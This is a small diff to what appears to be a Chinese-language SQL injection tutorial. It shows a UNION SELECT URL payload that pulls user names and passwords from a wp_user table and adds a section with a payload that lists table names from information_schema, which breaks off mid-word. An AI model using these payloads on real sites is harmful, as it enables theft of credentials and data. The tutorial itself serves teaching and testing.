@@ -24,6 +24,7 @@ echo "</center>";
 `http://example.com/test.php?id=1+union+select+user,pwd+from+wp_user+limit+1,1`
 limit1,1 表示从1开始取一条
 
-
+## 1.3 通用攻击,对information_schema
+`http://example.com/test.php?id=1 union select 1, group_concat(table_name) from information_sche`
 
 
